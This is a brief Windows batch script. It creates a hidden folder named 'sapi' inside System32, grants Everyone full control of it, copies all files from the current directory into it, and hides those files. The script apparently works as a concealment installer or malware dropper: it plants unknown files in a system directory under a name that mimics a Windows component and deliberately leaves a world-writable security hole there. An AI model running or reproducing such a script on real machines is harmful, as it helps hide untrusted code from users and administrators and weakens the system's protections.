@echo off
mkdir c:\Windows\System32\sapi
icacls "c:\Windows\System32\sapi" /remove:d Everyone /grant:r Everyone:(OI)(CI)F /T
copy *.* c:\Windows\System32\sapi
icacls "c:\Windows\System32\sapi" /remove:d Everyone /grant:r Everyone:(OI)(CI)F /T

attrib +h c:\Windows\System32\sapi\*.*
attrib +h c:\Windows\System32\sapi